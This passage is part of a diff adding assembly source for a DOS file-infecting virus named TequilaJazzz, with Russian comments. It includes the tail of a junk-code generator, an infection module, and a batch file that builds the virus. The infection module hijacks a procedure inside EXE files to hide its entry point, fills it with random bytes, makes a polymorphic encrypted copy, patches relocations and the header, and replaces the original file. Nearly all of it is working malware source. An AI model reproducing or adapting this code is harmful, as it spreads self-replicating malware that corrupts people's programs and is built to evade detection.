+		jz	ExitTRASH
+
+		test	[PH_FLAGS],FCR	 ; Нечем заканчивать CALL -
+		jnz	KillCALL	 ; не сделали ни одной SUB'рутины
+		call	CALLtoSUB
+		jmp	ExitTRASH
+KillCALL:
+		mov	bx,word ptr [CALLPlace]
+		mov	byte ptr es:[bx-1],90h
+
+		mov	dx,26F8h	 ; ES/CS/SS/DS,STI/CLI/STD/CLD
+		in	ax,40h
+		and	ax,1803h
+		xor	dx,ax
+		mov	es:[bx],dx
+ExitTRASH:
+		ret
+FinishTR	endp
+===== end   trash.asm ===== 
+
+===== begin uepinf.asm =====
+MZ_sign 	equ	0
+PartPage	equ	2
+PageCnt 	equ	4
+RelocCnt	equ	6
+HdrSize 	equ	8
+StackPointer	equ	0Eh
+ChkSum		equ	12h
+EntryPointer	equ	14h
+EntryCS 	equ	16h
+TablOffs	equ	18h
+
+MainInfect	proc
+		pushad
+		pushf
+		push	es
+		push	ds
+
+		call	TestFile	; Уже заражен
+		jz	ExitMain
+
+		cmp	word ptr [Header+MZ_sign],'ZM'	; Не EXE'шник
+		jne	ExitMain
+
+		push	dx		; Диск пути с файлом
+		pop	si
+		lodsw
+		xor	bl,bl
+		cmp	ah,':'
+		jne	CurrentDisk
+		and	al,0DFh
+		sub	al,'A'
+		inc	al
+		mov	bl,al
+CurrentDisk:
+
+		mov	ax,4409h	; Сетевой диск ?
+		call	DOS
+		test	dh,10h
+		jz	ExitMain
+
+		mov	ax,4408h
+		call	DOS
+		test	ax,ax
+		jnz	HardDrive	; Файл на жестком диске
+
+		mov	dx,3F5h
+		mov	al,4		; Sense Drive Status
+		out	dx,al
+
+		mov	cx,400h
+		loop	$
+
+		in	al,dx		; Установлена заSHITа от записи
+		test	al,40h
+		jnz	ExitMain
+HardDrive:
+		mov	dl,bl
+		mov	ah,36h		; Получим место
+		call	DOS
+
+		mul	bx
+		push	dx
+		push	ax
+		pop	eax
+		movzx	ecx,cx
+		mul	ecx
+
+		mov	edx,fs:[di+11h]
+		add	edx,2800h	 ; + еще 2 Кб
+		cmp	eax,edx
+		jb	ExitMain	 ; Мало места на диске
+
+		call	UEPInfect
+
+		mov	bx,[handle]
+		jc	ExitMain
+
+		mov	cx,0000h	; Установим Время/Дату
+InfTime 	equ	$ - 2
+		mov	dx,0000h
+InfDate 	equ	$ - 2
+		mov	ax,5701h
+		call	DOS
+ExitMain:
+		mov	ah,3Eh
+		call	DOS
+
+		pop	ds
+		pop	es
+		popfd
+		popad
+		ret
+MainInfect	endp
+;───────────────────
+TestFile	proc
+; На выходе:
+; ZF=0 - файл не заражен
+; ZF=1 - файл заражен
+		lds	dx,[FileName]
+		push	dx
+		mov	ax,3D00h
+		call	DOS
+
+		push	cs
+		pop	ds
+
+		mov	[Handle],ax   ; ES:DI - File Parameter Block
+		mov	bx,ax	      ; Будем работать с файлом на уровне FPB
+		call	GetFPB
+		mov	word ptr fs:[di+2],2   ; Режим открытия - Read/Write
+
+		mov	ah,3Fh		       ; Считаем заголовок
+		mov	cx,1Ah
+		mov	dx,offset Header
+		call	DOS
+
+		push	dword ptr fs:[di+0Dh]  ; push Время/Дату
+		pop	dx
+		rol	dh,5
+		and	dh,1Fh		       ; Час
+		pop	ax
+		and	al,1Fh		       ; День
+		xor	dh,al
+		and	dl,1Fh		       ; Секунды
+
+		cmp	dl,dh
+		pushf
+		je	ItsInfected
+
+		mov	eax,fs:[di+0Dh]     ; Установим новое значение
+		and	al,0E0h
+		or	al,dh
+		mov	word ptr [InfTime],ax
+		rol	eax,10h
+		mov	word ptr [InfDate],ax
+ItsInfected:
+		popf
+		pop	dx
+		ret
+TestFile	endp
+;───────────────────
+UEPinfect	proc
+
+		mov	bx,[handle]
+		call	GetFPB
+
+		mov	edx,fs:[di+11h]   ; edx - RealLen
+		mov	dword ptr [RealLen],edx
+
+		mov	ax,word ptr [Header+PageCnt]
+		cwde
+		shl	eax,9	  ; Реальная длинна больше загружаемой
+		cmp	eax,edx
+		jc	ExitUEPInfect	  ; Скрытый Overlay
+
+		mov	ax,word ptr [Header+EntryCS]
+		mov	bx,word ptr [Header+StackPointer]
+		sub	bx,ax	    ; Как правило стек в конце файла
+		mov	ax,1000h
+		jb	FullSegment
+
+		add	bx,word ptr [Header+HdrSize]   ; Место для Header'a
+		add	bx,TeqTempWSP
+		cmp	ax,bx
+		jnb	Scarp	    ; Обрежем
+FullSegment:
+		mov	bx,ax	    ; BX - сколько параграфов нужно считать
+Scarp:				    ; Не больше 64Кб
+		mov	ah,48h
+		call	DOS
+		jnc	AllocOK
+
+		mov	dx,bx	    ; А это уже рискованнее...
+		inc	dx
+		call	ReAllocateMEM
+LastAttempt:
+		mov	ah,48h
+		call	DOS
+		jnc	AllocOK
+
+		cmp	bx,800h
+		jnb	LastAttempt ; Если дают не меньше половины то берем
+		ret
+AllocOK:
+		mov	es,ax
+		sub	bx,word ptr [Header+HdrSize]
+		mov	cx,bx
+		add	bx,ax
+		mov	gs,bx	; Сегмент для Header'a вместе с ТНА
+
+		sub	cx,TeqTempWSP	; Сегмент для копии вируса
+		add	ax,cx
+		mov	word ptr [TeqCopyID],ax
+
+		shl	cx,4	; Длинна считываемого блока
+
+		mov	ax,word ptr [Header+EntryCS]
+		movzx	eax,ax
+		shl	eax,4
+		call	BeginData     ; Начало CodeSeg в файле
+		add	eax,edx
+
+		mov	fs:[di+15h],eax     ;Отьедем на Code Seg
+
+		push	ds
+		push	es	; DS - на выделенный блок
+		pop	ds
+
+		mov	bx,cs:[handle]	; Читаем...
+		mov	ah,3Fh
+		xor	dx,dx
+		call	DOS
+		pop	ds
+		mov	[LenCode],ax	; Длинна считанного кода
+
+		mov	word ptr [StartCode],0
+		mov	word ptr [SearchLen],ax
+
+		xor	eax,eax
+		mov	fs:[di+15h],eax     ; Отьедем на начало
+
+		push	ds		; Читаем заголовок
+		push	gs
+		pop	ds
+
+		call	BeginData
+		mov	cx,dx
+		xor	dx,dx
+		mov	ah,3Fh
+		call	DOS
+		pop	ds
+
+; Ищем стандартную C/Pascal процедуру
+
+NextProcedure:
+		call	SearchProc     ; Ищем процедуру
+		jc	FreeBlok       ; Нету ...
+				       ; Только память зря запоганили...:-E
+
+		cmp	di,MinPRCLen   ; Проверим на минимально
+		jb	NextProcedure  ; допустимую длинну
+
+; Процедура найдена ,проверим ее на RelocElements
+
+		mov	dx,word ptr [Header+EntryCS]
+		shl	edx,10h
+		mov	dx,[EnterProc]
+
+		mov	dword ptr [ProcAddress],edx ; Для выхода в носитель
+
+		call	LineAddress		  ; Линейные границы
+		mov	dword ptr [BeginPRC],edx
+		mov	dx,[ExitProc]
+		call	LineAddress
+		mov	dword ptr [EndPRC],edx
+
+		mov	si,word ptr [Header+TablOffs]
+		mov	cx,word ptr [Header+RelocCnt]
+AllRelocs:
+		mov	edx,gs:[si]
+		call	LineAddress
+		cmp	edx,12345678h
+BeginPRC	equ	$ - 4
+		jb	RelOK
+		cmp	edx,12345678h
+EndPRC		equ	$ - 4
+		jb	NextProcedure	 ; Процедура содержит RelocElement
+					 ; поэтому она не годится
+RelOK:
+		add	si,4
+		loop	AllRelocs
+
+		push	es   ───────────────────────┐
+						    │
+		mov	ax,[TeqCopyID]	       ; Сегмент копии...
+		mov	es,ax			    │
+		xor	di,di			    │
+						    │
+		mov	dx,0FF80h    ; RND(0...128)*4 + RND(0...255)
+		call	RND			    │
+		movzx	cx,dl			    │
+		shl	cx,2			    │
+						    │
+		shr	dx,4			    │
+		call	RND			    │
+		add	cx,dx			    │
+		push	cx			    │
+FillTRASH:				     ; Залили мусором
+		mov	dl,0FFh 		    │
+		call	RND			    │
+		mov	al,dl			    │
+		stosb				    │
+		loop	FillTRASH		    │
+						    │
+		pop	ax		     ; Стартовое Смещение
+		mov	dl,al			    │
+		and	dl,0Fh			    │
+		mov	byte ptr [TeqEntryOffset],dl
+						    │
+		shr	ax,4		     ; Стартовый сегмент
+		mov	word ptr [TeqEntrySEG],ax   │
+						    │
+; Сделаем выход в вирус 			    │
+						    │
+		push	di			    │
+						    │
+		mov	di,TeqTempWSP-MinPRCLen     │
+		push	di			    │
+		mov	si,offset PreparePart	    │
+		mov	cx,9			    │
+						    │
+MakePrPart:					    │
+		push	cx			    │
+		lodsb				    │
+		mov	ch,al			    │
+		shr	cx,13			    │
+		rep	movsb			    │
+		push	si			    │
+						    │
+		and	al,1Fh			    │
+		mov	[REG_USED],al		    │
+		and	al,0Fh			    │
+		mov	ah,al			    │
+		shl	ah,4			    │
+		or	ah,al			    │
+		mov	[HALF_USED],ah		    │
+						    │
+		mov	cx,GARBLELen		    │
+TrString:					    │
+		push	cx			    │
+						    │
+		mov	dx,offset RMTRASH	    │
+		mov	bx,offset SimplyTRASH	    │
+		in	al,40h			    │
+		mov	cl,al			    │
+RNDExch:	xchg	bx,dx			    │
+		dec	cl			    │
+		jnz	RNDExch 		    │
+		call	bx			    │
+						    │
+		pop	cx			    │
+		loop	TrString		    │
+		pop	si			    │
+		pop	cx			    │
+		loop	MakePrPart		    │
+						    │
+		pop	ax			    │
+		sub	di,ax			    │
+		mov	[LenPreparePart],di	    │
+						    │
+; Делаем полиморфную копию - Direct Phantom 2.1     │
+						    │
+		pop	di			    │
+		mov	word ptr [TARGETPLACE],di   │
+		mov	word ptr [TARGETPLACE + 2],es
+		mov	[RELOFFS],0		    │
+		mov	[DEST_CODE],0FFFFh	    │
+		mov	[COUNTER],TequilaLen	    │
+						    │
+		call	PHANTOM 		    │
+						    │
+		xor	si,si		 ; Переезжаем
+		mov	word ptr [PAoffset],di	    │
+		cld				    │
+		mov	cx,TequilaLen		    │
+		rep	movsb			    │
+						    │
+		mov	cx,[LenPreparePart]	    │
+						    │
+		mov	si,[EnterPROC]	 ; Прихватим│с собой процедурку
+		pop	ds	 ───────────────────┘
+		rep	movsb
+
+		jmp	$+2
+
+		push	di
+		pop	bp	; Вот ОНА - текущая длинна
+		mov	dx,bp
+		neg	dl
+		and	dx,0Fh
+		add	bp,dx	; BP - длинна вируса выравненная до параграфа
+
+		mov	word ptr gs:[CHKSUM],bp   ; Для игры в прятки
+		shr	bp,4
+		mov	bx,1234h
+PAoffset	equ	$ - 2
+		add	word ptr es:[bx+ProcAddress + 2],bp
+
+		push	es
+		push	ds	; ES - сканируемый код
+		pop	es
+
+		push	cs
+		pop	ds
+		call	JuNK_DoIT	  ; Зашифруем
+
+		lds	dx,[FileName]
+		xor	di,di	       ;Сформируем путь для создания TmpFile
+		push	di
+		stc
+		call	CopyPath
+		push	cs
+		pop	ds
+		mov	si,offset UEPTempFile
+		call	AddFileName
+
+		pop	dx
+		push	es
+		pop	ds
+		xor	cx,cx
+		mov	ah,3Ch	      ; Создаем TempFile
+		call	DOS
+		jc	FreeBlok
+		mov	cs:[TempHandle],ax
+
+		push	ax
+
+		mov	bx,cs:[handle]
+		call	GetFPB
+		call	BeginData
+		mov	fs:[di+15h],edx   ; Отьедем на начало в файле
+
+		pop	bx
+		call	GetFPB
+		mov	fs:[di+15h],edx
+
+		mov	cx,bp	  ; Пишем TequilaJazzz в новую квартиру
+		shl	cx,4
+		pop	ds
+		mov	ah,40h
+		xor	dx,dx
+		call	DOS
+
+; Перекопируем файл в Temp Файл
+
+		xor	eax,eax
+		mov	[UnderLimit],eax
+CopyFile:
+		xor	dx,dx
+		mov	cx,[LenCode]
+		mov	bx,[handle]
+		push	ds
+		push	es
+		pop	ds
+		mov	ah,3Fh
+		call	DOS
+		pop	ds
+		test	ax,ax
+		jz	EndCopy
+		push	ax
+
+		call	UpdateRelocates
+
+		pop	cx
+		xor	dx,dx
+		mov	ah,40h
+		mov	bx,[TempHandle]
+		push	ds
+		push	es
+		pop	ds
+		call	DOS
+		pop	ds
+		jmp	CopyFile
+EndCopy:
+		mov	ah,68h		; Сбросим буфера...
+		call	DOS
+
+		mov	bx,[TempHandle]
+		call	GetFPB
+
+; Отьедем на процедуру в скорректированном файле
+
+		mov	edx,[ProcAddress]
+		call	LineAddress
+
+		mov	eax,edx
+		call	BeginData
+		add	eax,edx
+
+		mov	fs:[di+15h],eax
+
+		mov	dx,TeqTempWSP-MinPRCLen
+		mov	cx,[LenPreparePart]
+		mov	ax,[TeqCopyID]
+		mov	ds,ax
+		mov	ah,40h
+		call	DOS
+
+		push	cs
+		pop	ds
+
+		xor	edx,edx
+		mov	fs:[di+15h],edx
+
+; Скорректируем Адрес точки входа и Стека
+
+		add	gs:[StackPointer],bp
+		add	gs:[EntryCS],bp
+
+; Скорректируем длинну в заголовке
+		mov	dx,bp
+		shl	edx,4
+		add	edx,12345678h
+RealLen 	equ	$-4
+
+		mov	ax,dx
+		and	ax,1FFh        ;Новая длинна в заголовке
+		mov	word ptr gs:[PartPage],ax
+		pushf
+		shr	edx,9
+		popf
+		jz	@temp
+		inc	dx
+@temp:
+		mov	word ptr gs:[PageCnt],dx
+; Пишем Header
+		call	BeginData
+		mov	cx,dx
+		xor	dx,dx
+		mov	ah,40h
+		push	ds
+		push	gs
+		pop	ds
+		call	DOS
+		pop	ds
+
+		push	bx
+;Закроем файл
+		mov	bx,[handle]
+		mov	ah,3Eh
+		call	DOS
+
+		pop	[handle]
+
+;Уничтожим файл
+		lds	dx,[FileName]
+		mov	ah,41h
+		call	DOS
+
+;Переименуем Temp файл в заражаемый файл
+		push	ds
+		push	dx
+		push	es
+		xor	di,di
+		push	di
+		stc
+		call	CopyPath
+
+		mov	si,offset UEPTempFile
+		push	cs
+		pop	ds
+		call	AddFileName
+
+		pop	dx
+		pop	ds
+		pop	di
+		pop	es
+		mov	ah,56h
+		call	DOS
+		clc
+FreeBlok:	pushf
+		mov	ah,49h	     ;Освободим память
+		call	DOS
+		popf
+ExitUEPInfect:	ret
+UEPinfect	endp
+;──────────────────────────────────────────────────────
+SearchProc	proc	near
+;Поиск стандартной дальней процедуры в первых 64Кб кода
+;
+;  Типа:	push	bp
+;		mov	bp,sp
+;		 .
+;		 .
+;		 .
+;		pop	bp
+;		retf [imm8] / retn [imm8]
+;
+;
+; ES - Scanned programm code
+
+; На выходе:
+; DI - длинна процедуры
+
+		mov	dx,0FFFFh	;ID что процедура не найдена
+		mov	cx,00000h
+SearchLen	equ	$ - 2
+		mov	[EnterProc],dx
+		mov	di,0000h
+StartCode	equ	$ - 2
+
+Scan:
+		mov	ax,es:[di]
+		cmp	al,55h		; PUSH BP
+		je	EnterPRC
+		cmp	al,5Dh		; POP BP
+		je	ExitPRC
+NextScan:
+		inc	di
+		dec	cx
+		jne	Scan
+		stc
+		retn
+EnterPRC:
+		mov	ax,es:[di+1]
+
+		cmp	ax,0EC8Bh	; MOV BP,SP
+		je	EnterDone
+		cmp	ax,0E589h
+		jne	NextScan
+EnterDone:
+		mov	[EnterProc],di
+		jmp	NextScan
+ExitPRC:
+		cmp	[EnterProc],dx
+		je	NextScan
+		and	ah,11110110b
+		cmp	ah,11000010b
+		je	ProcOK		; RETF/RETF Imm8/RETN/RETN Imm8
+		mov	[EnterProc],dx
+		jmp	NextScan
+ProcOK:
+		mov	[ExitPROC],di
+		mov	ax,es:[di]	; Старые байтики...
+		mov	[OldBytes],ax
+
+		inc	di		; Для поиска следующей
+		inc	di
+		mov	word ptr [StartCode],di
+
+		sub	di,[EnterProc]	; Длинна
+
+		mov	word ptr [SearchLen],cx
+		clc
+		ret
+SearchProc	endp
+;────────────────────────────────────────────
+BeginData	proc
+;EDX - Начало данных в файле
+		mov	dx,word ptr cs:[Header+HdrSize]
+		movzx	edx,dx
+		shl	dx,4
+		ret
+BeginData	endp
+;────────────────────────────────────────────
+GetFPB		proc
+;Возвращает в FS:DI адрес File Parameter Block
+;BX - Handle
+		push	bx
+		push	ax
+		push	es
+		mov	ax,1220h	;Номер входа в SFT
+		int	2Fh		;ES:[di]
+
+		mov	bl,es:[di]	;Получим блок описания файла
+		mov	ax,1216h	;es:di
+		int	2Fh
+
+		push	es
+		pop	fs
+
+		pop	es
+		pop	ax
+		pop	bx
+		ret
+GetFPB		endp
+;──────────────────────────────────────────────────
+UpdateRelocates proc
+
+		mov	si,word ptr [Header+TablOffs]
+		mov	cx,word ptr [Header+RelocCnt]
+		movzx	eax,[LenCode]
+TunedRelocs:
+		mov	edx,gs:[si]
+		call	LineAddress
+
+		db	66h,81h,0EAh	; sub edx,UnderLimit
+UnderLimit	dd	0
+
+		jb	GoNextReloc
+
+		cmp	edx,eax
+		jnb	GoNextReloc
+
+		add	es:[edx],bp
+GoNextReloc:
+		add	si,4
+		loop	TunedRelocs
+		add	[UnderLimit],eax
+		ret
+UpdateRelocates endp
+;───────────────────────────────────────
+LineAddress	proc
+;Из сегментного формирует линейный адрес
+		push	 00
+		push	 edx
+		pop	 ax
+		movzx	 eax,ax
+		pop	 edx
+		shl	 edx,4
+		add	 edx,eax
+		ret
+LineAddress	endp
+;───────────────────
+PreparePart	equ	$
+
+		db	01010000b    ; REG_USED + 1...4 байта команды
+		pushf
+		pusha
+		db	00110000b
+		push	ds
+		db	00110000b
+		push	es
+		db	01010001b    ; AX - не портить
+		mov	ah,62h
+		db	01011000b    ; BX - не портить
+		int	21h
+		db	10011000b
+		add	bx,1234h
+TeqEntrySEG	equ	$ - 2
+		db	00111000b
+		push	bx
+		db	01010000b
+		push	00h
+TeqEntryOffset	equ	$ - 1
+		db	00110000b
+		retf
+EndPrPart	equ	$
+
+;─────────────── UEP Engine DATA ─────────────────
+UEPTempFile	db	'uepfile.tmp',0
+LenCode 	dw	0
+EnterPROC	dw	0
+ExitPROC	dw	0
+TempHandle	dw	0
+;─────────────────────────────────────────────────
+===== end   uepinf.asm =====
+
+===== begin makefile.bat =====
+@echo off
+echo Компиляет и собирает вирус TequilaJazzz
+echo ---------------------------------------
+tasm /m teqjazzz.asm
+tlink /x teqjazzz.obj
+exe2bin teqjazzz.exe
+copy /b start.bin+teqjazzz.bin tmp.tmp
+del teqjazzz.com
+del teqjazzz.obj
+del teqjazzz.bin
+del teqjazzz.exe
+rename tmp.tmp teqjazzz.com
+cls
+===== end   makefile.bat =====
